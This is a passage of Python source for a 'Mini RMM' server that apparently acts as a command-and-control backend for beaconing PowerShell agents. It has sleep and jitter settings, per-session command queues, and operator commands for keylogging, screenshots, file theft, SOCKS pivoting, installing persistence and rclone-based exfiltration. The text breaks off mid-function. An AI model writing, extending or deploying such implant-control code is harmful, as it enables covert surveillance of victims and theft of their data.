#!/usr/bin/env python3
"""
Mini RMM HTTP Server — Compatible with cloudflared quick tunnel
Operator control: REST API under /api/v1/ (use rmm_cli.py or your own automation).
Optional embedded CLI: python server_rmm.py --cli (prompt_toolkit recommended).
Enhanced Features:
- Multi-session management
- Dynamic sleep/jitter configuration
- Tab completion and command history
- One-shot and persistent commands
- File upload/download
- Screenshot capture
- Keylogging support
- Persistence management
"""

from __future__ import annotations

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import argparse
import hashlib
import re
import secrets
import threading
import sys
import urllib.parse
import json
import time
import base64
from datetime import datetime
from collections import deque
import os
import readline
import glob
import shutil

try:
    from prompt_toolkit.completion import Completer as _PTCompleterBase
except ImportError:
    _PTCompleterBase = object  # RMMPTKCompleter only used when prompt_toolkit is installed

from rmm_ws import OperatorEventHub, WebSocketConnection
from rmm_socks import DEFAULT_SOCKS_PORT, DEFAULT_BIND_HOST, SocksManager
from rmm_rclone import (
    RcloneConfigError,
    get_rclone_max_bytes,
    RCLONE_BIN_PATH,
    DEFAULT_PROFILE,
    build_exfil_command,
    rclone_binary_available,
    rclone_public_config,
)
# History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
HISTORY_FILE = os.path.expanduser("~/.RMM_history")

# Configuration (overridden by argparse in main())
PORT = 8080
LOG_DIR = "RMM_logs"
WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web")
CLIENT_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "client_rmm.ps1")
SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")
HISTORY_DIR = os.path.join(LOG_DIR, "history")
WEB_MIME = {
    ".html": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".svg": "image/svg+xml",
    ".ico": "image/x-icon",
}
API_PREFIX = "/api/v1"
API_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()
BEACON_SECRET = os.environ.get("RMM_BEACON_SECRET", "").strip()
INSECURE = False
LISTEN_HOST = "127.0.0.1"
MAX_RESULT_EVENTS = 500
MAX_AI_CHAT_MESSAGES = 500
# Cap event body size on operator WebSocket pushes (full text stays in memory/history/API).
MAX_WS_EVENT_BODY = 16 * 1024


def _env_int(name: str, default: int) -> int:
    raw = os.environ.get(name, "").strip()
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        return default


# Per HTTP POST (each download chunk). Override with RMM_MAX_BODY_BYTES.
MAX_BODY_BYTES = _env_int("RMM_MAX_BODY_BYTES", 32 * 1024 * 1024)


def secure_compare(provided: str, expected: str) -> bool:
    """Constant-time secret comparison."""
    if not expected:
        return False
    if provided is None:
        provided = ""
    a = provided.encode("utf-8", errors="replace")
    b = expected.encode("utf-8", errors="replace")
    return secrets.compare_digest(a, b)


_BEACON_SESSION_UUID_RE = re.compile(
    r"^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$"
)
_BEACON_SESSION_TOKEN_RE = re.compile(r"^[A-Za-z0-9_-]{8,128}$")


def validate_beacon_session_id(session_id: str) -> str | None:
    """Reject path-like or unsafe beacon session IDs (blocks /tmp/pwn style abuse)."""
    if not session_id or not isinstance(session_id, str):
        return None
    sid = session_id.strip()
    if len(sid) < 8 or len(sid) > 128:
        return None
    if "/" in sid or "\\" in sid or ".." in sid or "\0" in sid:
        return None
    if sid.startswith(".") or sid.endswith("."):
        return None
    if _BEACON_SESSION_UUID_RE.match(sid):
        return sid
    if _BEACON_SESSION_TOKEN_RE.match(sid):
        return sid
    return None


def safe_session_storage_prefix(session_id: str) -> str:
    """Hash-based prefix for artifact filenames — never use session_id[:8] on disk."""
    return hashlib.sha256(session_id.encode("utf-8")).hexdigest()[:12]


def safe_storage_filename(filename: str, default: str = "download") -> str:
    """Basename-only filename safe for writes under LOG_DIR (blocks path traversal)."""
    if not filename or not isinstance(filename, str):
        return default
    name = os.path.basename(filename.replace("\\", "/")).strip().strip(".")
    if not name or name in (".", "..") or ".." in name:
        return default
    cleaned = "".join(c for c in name if c.isalnum() or c in "._- ")
    cleaned = cleaned.strip()[:200]
    return cleaned if cleaned else default


def safe_join_under(base_dir: str, *parts: str) -> str:
    """Join paths and ensure the result stays under base_dir."""
    base = os.path.realpath(base_dir)
    path = os.path.realpath(os.path.join(base, *parts))
    if path != base and not path.startswith(base + os.sep):
        raise ValueError("path escapes storage directory")
    return path


def _history_session_dir(session_id: str) -> str:
    sid = validate_beacon_session_id(session_id)
    if not sid:
        raise ValueError("invalid session id")
    return safe_join_under(HISTORY_DIR, sid)


def _event_for_history(ev: dict) -> dict:
    """Drop server-local filesystem paths before writing transcripts to disk."""
    return {k: v for k, v in ev.items() if k != "artifact"}


def _event_for_ws(ev: dict) -> dict:
    """Shrink large bodies so WS send_json does not block beacon handlers on slow clients."""
    out = dict(ev)
    body = out.get("body")
    if isinstance(body, str) and len(body) > MAX_WS_EVENT_BODY:
        omitted = len(body) - MAX_WS_EVENT_BODY
        out["body"] = body[:MAX_WS_EVENT_BODY] + f"\n… [{omitted} chars truncated for live WS]"
        out["body_truncated"] = True
    return out

# Create directories
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "downloads"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "screenshots"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "keylogs"), exist_ok=True)
os.makedirs(HISTORY_DIR, exist_ok=True)

# ANSI Colors
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class Session:
    def __init__(self, session_id, hostname, username, ip=None):
        self.id = session_id
        self.hostname = hostname
        self.username = username
        self.ip = ip
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.cmd_queue = deque()
        self.persistent_cmd = None
        self.cmd_timeout = 30
        self.work_dir = None
        self.os_type = "windows"
        # Configuration parameters
        self.sleep_seconds = 60  # Default 1 minute
        self.jitter_percent = 30  # Default 30% jitter
        self.result_events = deque(maxlen=MAX_RESULT_EVENTS)
        self._event_seq = 0
        self.wait_lock = threading.Lock()
        self.wait_event = None
        self.wait_result = None
        self.download_artifacts = []
        self.pending_downloads = deque()
        # True once operator/client config is known; defers idle __CONFIG__ until then.
        self.config_synced = False
        self.config_pending = False
    
    def beacon_status(self):
        """online / stale / offline from last beacon poll vs configured sleep+jitter."""
        elapsed = (datetime.now() - self.last_seen).total_seconds()
        jitter_max = self.sleep_seconds * (self.jitter_percent / 100.0)
        expected_max = self.sleep_seconds + jitter_max + 15
        if elapsed <= expected_max * 1.5:
            return "online"
        if elapsed <= expected_max * 4:
            return "stale"
        return "offline"

    def to_dict(self):
        elapsed = int((datetime.now() - self.last_seen).total_seconds())
        return {
            "id": self.id,
            "hostname": self.hostname,
            "username": self.username,
            "ip": self.ip,
            "first_seen": self.first_seen.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "last_seen_ago_seconds": elapsed,
            "beacon_status": self.beacon_status(),
            "work_dir": self.work_dir,
            "os_type": self.os_type,
            "sleep_seconds": self.sleep_seconds,
            "jitter_percent": self.jitter_percent
        }
    
    def __str__(self):
        return f"{Colors.GREEN}{self.username}@{self.hostname}{Colors.END} [{self.id[:8]}]"

class Completer:
    """Custom completer for readline"""

    def __init__(self, server):
        self.server = server
        self.commands = [
            'list', 'use', 'info', 'background', 'kill',
            'set_sleep', 'set_jitter', 'show_config',
            'download', 'upload', 'exfil', 'screenshot', 'socks',
            'keylog', 'persist', 'stop',
            'install_persist', 'remove_persist',
            'help', 'clear', 'quit', 'exit',
        ]
        self.keylog_actions = ['start', 'stop', 'dump']

    def complete(self, text, state):
        """Return possible completions for the current text"""
        line = readline.get_line_buffer()
        parts = line.split()
        
        # If no text or first word being completed
        if not parts or (len(parts) == 1 and not line.endswith(' ')):
            matches = [cmd for cmd in self.commands if cmd.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete arguments for specific commands
        cmd = parts[0].lower()
        
        # Complete session IDs for 'use' and 'kill'
        if cmd in ['use', 'kill'] and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            if self.server.sessions:
                session_ids = [sid[:8] for sid in self.server.sessions.keys()]
                matches = [sid for sid in session_ids if sid.startswith(text)]
                if state < len(matches):
                    return matches[state]
            return None
        
        # Complete keylog actions
        if cmd == 'keylog' and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            matches = [action for action in self.keylog_actions if action.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete local files for 'upload'
        if cmd == 'upload' and len(parts) == 2 and not line.endswith(' '):
            # Complete local file path
            matches = glob.glob(text + '*')
            if state < len(matches):
                return matches[state]
            return None
        
        return None


class RMMPTKCompleter(_PTCompleterBase):
    """prompt_toolkit completer mirroring Completer (no readline.get_line_buffer)."""

    def __init__(self, server):
        super().__init__()
        self.server = server
        self._words = Completer(server)

    def get_completions(self, document, complete_event):
        from prompt_toolkit.completion import Completion

        line = document.text_before_cursor
        parts = line.split()

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            prefix = parts[0] if parts else ""
            for cmd in self._words.commands:
                if cmd.startswith(prefix):
                    yield Completion(cmd + " ", start_position=-len(prefix))
            return

        cmd = parts[0].lower()

        if cmd in ("use", "kill"):
            if len(parts) == 1 and line.endswith(" "):
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    yield Completion(s8 + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    if s8.startswith(prefix):
                        yield Completion(s8, start_position=-len(prefix))
                return

        if cmd == "keylog":
            if len(parts) == 1 and line.endswith(" "):
                for a in self._words.keylog_actions:
                    yield Completion(a + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for a in self._words.keylog_actions:
                    if a.startswith(prefix):
                        yield Completion(a + " ", start_position=-len(prefix))
                return

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            prefix = parts[1]
            for m in glob.glob(prefix + "*"):
                yield Completion(m, start_position=-len(prefix))
            return


def _build_cli_prompt(server):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    prefix = f"{Colors.DIM}[{ts}]{Colors.END} "
    if server.current_session:
        sess = server.get_session(server.current_session)
        if sess:
            return f"{prefix}{Colors.GREEN}RMM [{sess.id[:8]}] > {Colors.END}"
        server.current_session = None
    return f"{prefix}{Colors.GREEN}RMM > {Colors.END}"


def _run_cli_prompt_toolkit(server, cli):
    """Fixed bottom input line; client output prints above (patch_stdout)."""
    from prompt_toolkit import PromptSession
    from prompt_toolkit.formatted_text import ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.patch_stdout import patch_stdout

    server._cli_use_ptk = True
    session = PromptSession(
        history=FileHistory(HISTORY_FILE),
        completer=RMMPTKCompleter(server),
        complete_style="COLUMN",
        enable_history_search=True,
    )
    with patch_stdout():
        while server.running:
            try:
                prompt = _build_cli_prompt(server)
                cmd = session.prompt(ANSI(prompt))
                if not cli.execute_command(cmd):
                    break
            except KeyboardInterrupt:
                # Ctrl+C: cancel current line (like a shell); do not exit the server
                continue
            except EOFError:
                # Ctrl+D: end session (empty buffer in prompt_toolkit)
                server.tty_print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
                break


def _run_cli_readline(server, cli):
    """Fallback: stdlib readline + input() when prompt_toolkit is not installed."""
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass
    readline.set_history_length(1000)
    completer = Completer(server)
    readline.set_completer(completer.complete)
    readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" \t\n;")

    while server.running:
        try:
            prompt = _build_cli_prompt(server)
            cmd = input(prompt)
            if not cli.execute_command(cmd):
                break
        except KeyboardInterrupt:
            print()
            continue
        except EOFError:
            print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
            break


class RMMServer:
    def __init__(self):
        self.sessions = {}
        self.killed_sessions = set()
        self._persisted_session_configs = self._load_persisted_session_configs()
        self.session_lock = threading.Lock()
        self.tty_lock = threading.Lock()  # Serialize async client stdout
        self._cli_use_ptk = False  # True when using prompt_toolkit (skip readline.redisplay in handle_result)
        self.current_session = None
        self.running = True
        self.event_hub = OperatorEventHub()
        self.socks = SocksManager(log_fn=self.log)
        self._sessions_broadcast_lock = threading.Lock()
        self._sessions_broadcast_timer = None
        self._archive_orphaned_sessions_on_startup()

    @staticmethod
    def _format_ago(seconds):
        if seconds < 60:
            return f"{seconds}s ago"
        if seconds < 3600:
            return f"{seconds // 60}m ago"
        if seconds < 86400:
            return f"{seconds // 3600}h ago"
        return f"{seconds // 86400}d ago"

    def tty_print(self, msg="", *, ansi=True, end="\n", flush=True):
        """Stdout for CLI/logs. Under prompt_toolkit.patch_stdout, plain print() corrupts ESC (shows as '?')."""
        if self._cli_use_ptk:
            from prompt_toolkit import print_formatted_text
            if ansi:
                from prompt_toolkit.formatted_text import ANSI
                print_formatted_text(ANSI(msg), end=end)
            else:
                print_formatted_text(msg, end=end)
            if flush:
                sys.stdout.flush()
        else:
            print(msg, end=end, flush=flush)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CMD": Colors.BLUE
        }.get(level, Colors.END)
        self.tty_print(f"{Colors.DIM}[{timestamp}]{Colors.END} {color}[{level}]{Colors.END} {message}")
    
    @staticmethod
    def _load_persisted_session_configs():
        """Load sleep/jitter by session id from disk (survives server restart)."""
        configs = {}
        if not os.path.exists(SESSION_FILE):
            return configs
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                sessions_data = json.load(f)
        except (OSError, json.JSONDecodeError):
            return configs
        if not isinstance(sessions_data, dict):
            return configs
        for session_id, rec in sessions_data.items():
            if not isinstance(rec, dict):
                continue
            if "sleep_seconds" not in rec and "jitter_percent" not in rec:
                continue
            configs[session_id] = {
                "sleep_seconds": max(1, min(3600, int(rec.get("sleep_seconds", 60)))),
                "jitter_percent": max(0, min(100, int(rec.get("jitter_percent", 30)))),
            }
        return configs

    @staticmethod
    def _load_persisted_session_records() -> dict[str, dict]:
        """Load full session records from sessions.json (id → dict)."""
        if not os.path.exists(SESSION_FILE):
            return {}
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                sessions_data = json.load(f)
        except (OSError, json.JSONDecodeError):
            return {}
        if not isinstance(sessions_data, dict):
            return {}
        records: dict[str, dict] = {}
        for session_id, rec in sessions_data.items():
            sid = validate_beacon_session_id(session_id)
            if sid and isinstance(rec, dict):
                records[sid] = rec
        return records

    @staticmethod
    def _session_from_record(session_id: str, rec: dict) -> Session:
        """Rebuild a Session from sessions.json or history meta (no in-memory events)."""
        session = Session(
            session_id,
            rec.get("hostname") or "?",
            rec.get("username") or "?",
            rec.get("ip"),
        )
        for attr, key in (("first_seen", "first_seen"), ("last_seen", "last_seen")):
            raw = rec.get(key)
            if not raw:
                continue
            try:
                setattr(session, attr, datetime.fromisoformat(str(raw)))
            except (TypeError, ValueError):
                pass
        session.sleep_seconds = max(1, min(3600, int(rec.get("sleep_seconds", 60))))
        session.jitter_percent = max(0, min(100, int(rec.get("jitter_percent", 30))))
        if rec.get("work_dir") is not None:
            session.work_dir = rec.get("work_dir")
        if rec.get("os_type"):
            session.os_type = rec.get("os_type")
        session.config_synced = True
        return session

    def _history_event_count(self, session_id: str) -> int:
        events_path = self._history_events_path(session_id)
        if not os.path.isfile(events_path):
            return 0
        try:
            with open(events_path, "r", encoding="utf-8") as f:
                return sum(1 for line in f if line.strip())
        except OSError:
            return 0

    def _load_history_events_from_disk(self, session_id: str) -> list[dict]:
        """Read archived transcript lines for a session (empty if none)."""
        events_path = self._history_events_path(session_id)
        if not os.path.isfile(events_path):
            return []
        loaded: list[dict] = []
        try:
            with open(events_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        ev = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    if isinstance(ev, dict):
                        loaded.append(ev)
        except OSError:
            return []
        return loaded

    def _apply_history_meta_to_session(self, session) -> None:
        """Restore first_seen / work_dir from on-disk meta when a session reconnects."""
        meta_path = self._history_meta_path(session.id)
        if not os.path.isfile(meta_path):
            return
        try:
            with open(meta_path, "r", encoding="utf-8") as f:
                meta = json.load(f)
        except (OSError, json.JSONDecodeError):
            return
        if not isinstance(meta, dict):
            return
        raw_first = meta.get("first_seen")
        if raw_first:
            try:
                session.first_seen = datetime.fromisoformat(str(raw_first))
            except (TypeError, ValueError):
                pass
        if meta.get("work_dir") is not None:
            session.work_dir = meta.get("work_dir")

    def _rehydrate_session_events_from_history(self, session) -> int:
        """Load archived events into memory after restart so live console keeps the transcript."""
        loaded = self._load_history_events_from_disk(session.id)
        if not loaded:
            return 0
        max_id = 0
        for ev in loaded[-MAX_RESULT_EVENTS:]:
            session.result_events.append(ev)
            max_id = max(max_id, int(ev.get("id") or 0))
        session._event_seq = max_id
        return len(loaded)

    def _archive_orphaned_sessions_on_startup(self) -> None:
        """Mark pre-restart sessions as ended so they appear in session history."""
        candidates: dict[str, dict] = {}
        for sid, rec in self._load_persisted_session_records().items():
            candidates[sid] = rec
        if os.path.isdir(HISTORY_DIR):
            try:
                names = os.listdir(HISTORY_DIR)
            except OSError:
                names = []
            for name in names:
                sid = validate_beacon_session_id(name)
                if not sid or sid in candidates:
                    continue
                meta_path = os.path.join(HISTORY_DIR, name, "meta.json")
                rec: dict = {}
                if os.path.isfile(meta_path):
                    try:
                        with open(meta_path, "r", encoding="utf-8") as f:
                            loaded = json.load(f)
                        if isinstance(loaded, dict):
                            rec = loaded
                    except (OSError, json.JSONDecodeError):
                        pass
                candidates[sid] = rec

        archived = 0
        for sid, rec in candidates.items():
            if sid in self.sessions:
                continue
            meta_path = self._history_meta_path(sid)
            if os.path.isfile(meta_path):
                try:
                    with open(meta_path, "r", encoding="utf-8") as f:
                        existing = json.load(f)
                    if isinstance(existing, dict) and existing.get("ended_at"):
                        self.remove_persisted_session(sid)
                        continue
                except (OSError, json.JSONDecodeError):
                    pass
            session = self._session_from_record(sid, rec)
            self._finalize_session_history(session, reason="server_restart")
            self.remove_persisted_session(sid)
            archived += 1
        if archived:
            self.log(f"Archived {archived} orphaned session(s) from before restart", "INFO")

    def _persisted_config_from_history_meta(self, session_id: str) -> dict | None:
        """Restore sleep/jitter from archived meta when sessions.json no longer has the row."""
        meta_path = self._history_meta_path(session_id)
        if not os.path.isfile(meta_path):
            return None
        try:
            with open(meta_path, "r", encoding="utf-8") as f:
                meta = json.load(f)
        except (OSError, json.JSONDecodeError):
            return None
        if not isinstance(meta, dict):
            return None
        if "sleep_seconds" not in meta and "jitter_percent" not in meta:
            return None
        return {
            "sleep_seconds": max(1, min(3600, int(meta.get("sleep_seconds", 60)))),
            "jitter_percent": max(0, min(100, int(meta.get("jitter_percent", 30)))),
        }

    def remove_persisted_session(self, session_id: str) -> None:
        """Drop a session from sessions.json (live registry file, not history events)."""
        self._persisted_session_configs.pop(session_id, None)
        if not os.path.exists(SESSION_FILE):
            return
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except (OSError, json.JSONDecodeError):
            return
        if not isinstance(data, dict) or session_id not in data:
            return
        del data[session_id]
        try:
            with open(SESSION_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except OSError as e:
            self.log(f"Failed to remove {session_id[:8]} from sessions.json: {e}", "WARNING")

    def save_session(self, session):
        sessions_data = {}
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'r') as f:
                sessions_data = json.load(f)
        
        sessions_data[session.id] = session.to_dict()
        self._persisted_session_configs[session.id] = {
            "sleep_seconds": session.sleep_seconds,
            "jitter_percent": session.jitter_percent,
        }
        
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions_data, f, indent=2)
    
    def touch_session(self, session_id):
        """Update last_seen when a beacon polls or posts a result."""
        with self.session_lock:
            session = self.sessions.get(session_id)
            if session:
                session.last_seen = datetime.now()
                return True
        return False

    def get_session(self, session_id):
        with self.session_lock:
            return self.sessions.get(session_id)
    
    def find_session_by_prefix(self, prefix):
        """Find a session by ID prefix (minimum 4 characters)"""
        with self.session_lock:
            matching_sessions = []
            for session_id, session in self.sessions.items():
                if session_id.startswith(prefix):
                    matching_sessions.append((session_id, session))
            
            if len(matching_sessions) == 1:
                return matching_sessions[0][1]
            elif len(matching_sessions) > 1:
                self.tty_print(f"{Colors.YELLOW}Multiple sessions match prefix '{prefix}':{Colors.END}")
                for sid, session in matching_sessions:
                    self.tty_print(f"  {sid[:8]} - {session.username}@{session.hostname}", ansi=False)
                return None
            else:
                return None

    def resolve_session(self, session_id_or_prefix):
        """Resolve session by full id or unique prefix (4+ chars)."""
        session = self.get_session(session_id_or_prefix)
        if session:
            return session
        if len(session_id_or_prefix) >= 4:
            return self.find_session_by_prefix(session_id_or_prefix)
        return None

    def note_download_queued(self, session, remote_path: str) -> None:
        """Remember remote path for the next file_upload from this session."""
        path = (remote_path or "").strip()
        if not path or not session:
            return
        with self.session_lock:
            session.pending_downloads.append(path)

    def pop_pending_download_path(self, session, filename: str) -> str:
        """Match a completed upload to a queued __DOWNLOAD__ path by basename, else FIFO."""
        basename = os.path.basename((filename or "").replace("\\", "/"))
        with self.session_lock:
            for i, remote_path in enumerate(session.pending_downloads):
                rp_base = os.path.basename(remote_path.replace("\\", "/"))
                if rp_base == basename:
                    del session.pending_downloads[i]
                    return remote_path
            if session.pending_downloads:
                return session.pending_downloads.popleft()
        return basename or filename or "unknown"

    @staticmethod
    def _make_download_entry(filepath: str, remote_path: str) -> dict:
        basename = os.path.basename(filepath)
        try:
            size = os.path.getsize(filepath)
            received_at = datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()
        except OSError:
            size = 0
            received_at = datetime.now().isoformat()
        return {
            "artifact": basename,
            "remote_path": remote_path,
            "size": size,
            "received_at": received_at,
            "artifact_url": RMMServer._artifact_public_url(filepath),
        }

    def register_download_artifact(self, session, filepath: str, remote_path: str) -> None:
        """Index a completed agent download for operator listing."""
        prefix = safe_session_storage_prefix(session.id)
        basename = os.path.basename(filepath)
        if not basename.startswith(f"{prefix}_"):
            return
        entry = self._make_download_entry(filepath, remote_path)
        with self.session_lock:
            session.download_artifacts = [
                e for e in session.download_artifacts if e.get("artifact") != basename
            ]
            session.download_artifacts.append(entry)
            session.download_artifacts.sort(
                key=lambda e: e.get("received_at") or "", reverse=True
            )

    def backfill_download_artifacts(self, session) -> None:
        """Scan RMM_logs/downloads for files belonging to this session."""
        prefix = safe_session_storage_prefix(session.id)
        downloads_dir = os.path.join(LOG_DIR, "downloads")
        if not os.path.isdir(downloads_dir):
            return
        pattern_prefix = f"{prefix}_"
        with self.session_lock:
            known = {e.get("artifact") for e in session.download_artifacts}
        try:
            names = sorted(os.listdir(downloads_dir))
        except OSError:
            return
        for name in names:
            if not name.startswith(pattern_prefix) or name.endswith(".part"):
                continue
            if name in known:
                continue
            try:
                path = safe_join_under(downloads_dir, name)
            except ValueError:
                continue
            if not os.path.isfile(path):
                continue
            stored_name = name[len(pattern_prefix) :]
            self.register_download_artifact(session, path, stored_name)

    def list_session_downloads(self, session_id_or_prefix):
        """Return download index rows for a session, or None if not found."""
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None
        self.backfill_download_artifacts(session)
        prefix = safe_session_storage_prefix(session.id)
        with self.session_lock:
            rows = [
                dict(e)
                for e in session.download_artifacts
                if str(e.get("artifact", "")).startswith(f"{prefix}_")
            ]
        rows.sort(key=lambda e: e.get("received_at") or "", reverse=True)
        return rows

    def queue_agent_download(self, session, remote_path: str) -> str:
        """Queue __DOWNLOAD__ on the agent and track the remote path."""
        cmd = f"__DOWNLOAD__ {remote_path}"
        self.set_command(session.id, cmd, "oneshot")
        self.note_download_queued(session, remote_path)
        return cmd

    def queue_agent_exfil(
        self,
        session,
        remote_path: str,
        profile_name: str,
        dest: str | None = None,
    ) -> str:
        """Queue __EXFIL__ on the agent (rclone upload from agent host)."""
        if not rclone_binary_available():
            raise ValueError(
                f"rclone binary not found — place rclone.exe at {RCLONE_BIN_PATH} "
                "or set RMM_RCLONE_BIN"
            )
        cmd = build_exfil_command(remote_path, profile_name, dest=dest)
        self.set_command(session.id, cmd, "oneshot")
        return cmd

    def _history_meta_path(self, session_id: str) -> str:
        return os.path.join(_history_session_dir(session_id), "meta.json")

    def _history_events_path(self, session_id: str) -> str:
        return os.path.join(_history_session_dir(session_id), "events.jsonl")

    def _ai_chat_path(self, session_id: str) -> str:
        return os.path.join(_history_session_dir(session_id), "ai_chat.json")

    @staticmethod
    def _normalize_ai_chat_messages(messages) -> list[dict]:
        if not isinstance(messages, list):
            return []
        out: list[dict] = []
        for m in messages:
            if not isinstance(m, dict):
                continue
            role = m.get("role")
            content = m.get("content")
            if role not in ("user", "assistant") or not isinstance(content, str):
                continue
            row: dict = {"role": role, "content": content}
            tool_calls = m.get("tool_calls_made")
            if not isinstance(tool_calls, list):
                tool_calls = m.get("toolCalls")
            if isinstance(tool_calls, list) and tool_calls:
                row["tool_calls_made"] = tool_calls
            out.append(row)
            if len(out) >= MAX_AI_CHAT_MESSAGES:
                break
        return out

    def get_ai_chat(self, session_id_or_prefix: str) -> tuple[str | None, list[dict] | None]:
        """Load persisted AI chat for a live or archived session."""
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return None, None
        path = self._ai_chat_path(session_id)
        if not os.path.isfile(path):
            return session_id, []
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except (OSError, json.JSONDecodeError) as e:
            self.log(f"AI chat read failed for {session_id[:8]}: {e}", "WARNING")
            return session_id, []
        messages = data.get("messages") if isinstance(data, dict) else []
        return session_id, self._normalize_ai_chat_messages(messages)

    def save_ai_chat(self, session_id: str, messages: list[dict]) -> None:
        """Persist AI chat under RMM_logs/history/{session_id}/ai_chat.json."""
        sid = validate_beacon_session_id(session_id)
        if not sid:
            return
        normalized = self._normalize_ai_chat_messages(messages)
        if len(normalized) > MAX_AI_CHAT_MESSAGES:
            normalized = normalized[-MAX_AI_CHAT_MESSAGES:]
        try:
            session_dir = _history_session_dir(sid)
        except ValueError:
            return
        os.makedirs(session_dir, exist_ok=True)
        payload = {
            "updated_at": datetime.now().isoformat(),
            "messages": normalized,
        }
        try:
            with open(self._ai_chat_path(sid), "w", encoding="utf-8") as f:
                json.dump(payload, f, ensure_ascii=False, indent=2)
        except OSError as e:
            self.log(f"AI chat write failed for {sid[:8]}: {e}", "WARNING")

    def clear_ai_chat(self, session_id: str) -> bool:
        """Remove persisted AI chat for a session (no-op if missing)."""
        sid = validate_beacon_session_id(session_id)
        if not sid:
            return False
        try:
            path = self._ai_chat_path(sid)
        except ValueError:
            return False
        if not os.path.isfile(path):
            return True
        try:
            os.remove(path)
            return True
        except OSError as e:
            self.log(f"AI chat delete failed for {sid[:8]}: {e}", "WARNING")
            return False

    def _history_write_meta(
        self,
        session,
        *,
        ended: bool = False,
        end_reason: str | None = None,
    ) -> None:
        try:
            session_dir = _history_session_dir(session.id)
        except ValueError:
            return
        os.makedirs(session_dir, exist_ok=True)
        meta = session.to_dict()
        meta["session_id"] = session.id
        meta["updated_at"] = datetime.now().isoformat()
        meta["active"] = session.id in self.sessions and not ended
        if ended:
            meta["ended_at"] = datetime.now().isoformat()
            meta["end_reason"] = end_reason or "ended"
        else:
            meta["ended_at"] = None
            meta["end_reason"] = None
        if session.result_events:
            meta["event_count"] = len(session.result_events)
        else:
            meta["event_count"] = self._history_event_count(session.id)
        try:
            with open(self._history_meta_path(session.id), "w", encoding="utf-8") as f:
                json.dump(meta, f, indent=2)
        except OSError as e:
            self.log(f"History meta write failed for {session.id[:8]}: {e}", "WARNING")

    def _history_append_event(self, session, ev: dict) -> None:
        try:
            session_dir = _history_session_dir(session.id)
        except ValueError:
            return
        os.makedirs(session_dir, exist_ok=True)
        line = json.dumps(_event_for_history(ev), ensure_ascii=False)
        try:
            with open(self._history_events_path(session.id), "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError as e:
            self.log(f"History event append failed for {session.id[:8]}: {e}", "WARNING")

    def _finalize_session_history(self, session, reason: str = "killed") -> None:
        self._history_write_meta(session, ended=True, end_reason=reason)

    def resolve_history_session_id(self, session_id_or_prefix: str) -> str | None:
        session = self.resolve_session(session_id_or_prefix)
        if session:
            return session.id
        if len(session_id_or_prefix) >= 4:
            matches = []
            if os.path.isdir(HISTORY_DIR):
                for name in os.listdir(HISTORY_DIR):
                    if name.startswith(session_id_or_prefix):
                        sid = validate_beacon_session_id(name)
                        if sid:
                            matches.append(sid)
            if len(matches) == 1:
                return matches[0]
        return validate_beacon_session_id(session_id_or_prefix)

    def list_session_history(self) -> list[dict]:
        rows = []
        active_ids = set(self.sessions.keys())
        if not os.path.isdir(HISTORY_DIR):
            return rows
        try:
            names = os.listdir(HISTORY_DIR)
        except OSError:
            return rows
        for name in names:
            sid = validate_beacon_session_id(name)
            if not sid:
                continue
            meta_path = os.path.join(HISTORY_DIR, name, "meta.json")
            if not os.path.isfile(meta_path):
                continue
            try:
